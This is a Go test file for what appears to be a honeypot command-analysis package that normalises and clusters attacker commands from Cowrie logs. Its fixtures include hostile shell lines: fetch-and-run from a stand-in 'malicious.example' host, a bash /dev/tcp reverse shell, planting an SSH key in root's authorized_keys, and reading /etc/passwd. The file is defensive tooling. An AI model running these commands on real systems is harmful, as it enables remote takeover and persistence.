package ttp

import (
	"testing"
	"time"

	"github.com/networkshard/shardlure/pkg/models"
)

func TestNormalise(t *testing.T) {
	cases := []struct{ in, want string }{
		{"wget http://1.2.3.4/x.sh -O /tmp/x", "wget <URL> -O <PATH>"},
		{"curl -sL http://malicious.example:8080/m | bash", "curl -sL <URL> | bash"},
		{"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "bash -i >& /dev/tcp/<IP>/<N> 0>&1"},
		{"echo ssh-rsa AAAA >> /root/.ssh/authorized_keys", "echo ssh-rsa AAAA >> <PATH>"},
		{"cat /etc/passwd", "cat <PATH>"},
		{"sha256sum deadbeefcafebabe1234", "sha256sum <HEX>"},
	}
	for _, c := range cases {
		got := Normalise(c.in)
		if got != c.want {
			t.Errorf("Normalise(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestHarvest(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	ev := func(off time.Duration, actor, cmd string) *models.Event {
		return &models.Event{
			TS: t0.Add(off), Source: models.SourceCowrie, Kind: models.KindCommand,
			ActorID: actor, Command: cmd,
		}
	}
	events := []*models.Event{
		// two different attackers running the same wget pattern
		ev(0, "cowrie:A", "wget http://1.1.1.1/x.sh -O /tmp/x"),
		ev(time.Minute, "cowrie:B", "wget http://2.2.2.2/y.sh -O /tmp/y"),
		// one actor running a unique reconnaissance command
		ev(2*time.Minute, "cowrie:A", "cat /etc/passwd"),
		// a third actor running yet another wget variant
		ev(3*time.Minute, "cowrie:C", "wget http://3.3.3.3/z.sh -O /tmp/z"),
		// non-command event should be ignored
		{TS: t0, Source: models.SourceCowrie, Kind: models.KindFailedPass,
			ActorID: "cowrie:D"},
	}
	rows := Harvest(events, 0)
	if len(rows) != 2 {
		t.Fatalf("want 2 clusters, got %d: %+v", len(rows), rows)
	}
	// Top row: wget template seen by 3 actors
	if rows[0].Template != "wget <URL> -O <PATH>" {
		t.Errorf("top template = %q", rows[0].Template)
	}
	if rows[0].ActorCount != 3 {
		t.Errorf("top ActorCount = %d, want 3", rows[0].ActorCount)
	}
	if rows[0].Count != 3 {
		t.Errorf("top Count = %d, want 3", rows[0].Count)
	}
	// Samples should preserve raw commands
	if len(rows[0].Samples) != 3 {
		t.Errorf("expected 3 samples (one per unique raw), got %d", len(rows[0].Samples))
	}
}
